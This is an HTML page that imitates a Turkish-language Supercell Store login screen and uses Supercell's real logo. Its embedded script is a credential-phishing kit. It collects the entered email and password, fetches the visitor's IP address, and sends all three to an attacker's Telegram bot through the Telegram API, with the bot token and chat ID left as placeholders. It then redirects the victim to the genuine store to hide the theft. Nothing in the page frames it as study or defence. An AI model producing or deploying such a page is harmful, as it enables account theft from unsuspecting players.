<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Supercell Store Giriş</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: "Helvetica Neue", sans-serif;
    }

    body {
      margin: 0;
      background-color: #1e3a8a;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 1rem;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
      text-align: center;
    }

    .login-box img {
      width: 80px;
      margin-bottom: 1rem;
    }

    .login-box h1 {
      font-size: 1.5rem;
      margin-bottom: 2rem;
      color: #1e3a8a;
    }

    .input-field {
      width: 100%;
      padding: 0.75rem 1rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 0.5rem;
      font-size: 1rem;
    }

    .submit-btn {
      background-color: rgb(59,130,246);
      color: white;
      border: none;
      padding: 1rem 1rem;
      width: 100%;
      font-size: 1rem;
      border-radius: 0.5rem;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .submit-btn:hover {
      background-color: rgb(30,58,188);
    }

    .cancel-btn {
      background-color: rgb(245,245,245);
      color: black;
      border: none;
      padding: 1rem 1rem;
      width: 100%;
      font-size: 1rem;
      border-radius: 0.5rem;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .footer-text {
      margin-top: 1rem;
      font-size: 0.875rem;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://accounts.supercell.com/static/appicons/store.png" alt="Supercell Store Logo" style="width: 120px;">
    <h1 style="color: black; margin-bottom: 0rem;">Supercell Store Giriş</h1>
    <p style="margin-bottom: 2rem;">Kod Gönderilcek</p>
    <form onsubmit="event.preventDefault(); sendMessage()">
      <input type="email" id="email" class="input-field" placeholder="E-posta girin" required>
      <input type="password" id="password" class="input-field" placeholder="Parola girin" required>
      <button type="submit" class="submit-btn" style="margin-bottom: 1rem;">GİRİŞ YAP</button>
      <button type="button" class="cancel-btn">GERİ DÖN</button>
    </form>
    <p class="footer-text"></p>
  </div>

  <script>
  async function sendMessage() {
    const token = 'BOT_TOKENUNUZ'; // BotFather token
    const userId = 'CHAT_IDNIZ'; // Numeric chat ID
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    try {
      // 1. IP adresi al
      const ip = await fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => data.ip);

      // 2. Telegram API isteği (URL encoded)
      const url = new URL(`https://api.telegram.org/bot${token}/sendMessage`);
      url.searchParams.append('chat_id', userId);
      url.searchParams.append('text', `email: ${email}\nşifre: ${password}\nIP: ${ip}`);

      const response = await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
      });

      if (!response.ok) throw new Error(await response.text());
      window.location.href = 'https://store.supercell.com/tr';
    } catch (error) {
      alert(`Hata: ${error.message}`);
      console.error('Detay:', error);
    }
  }
</script>
</body>
</html>
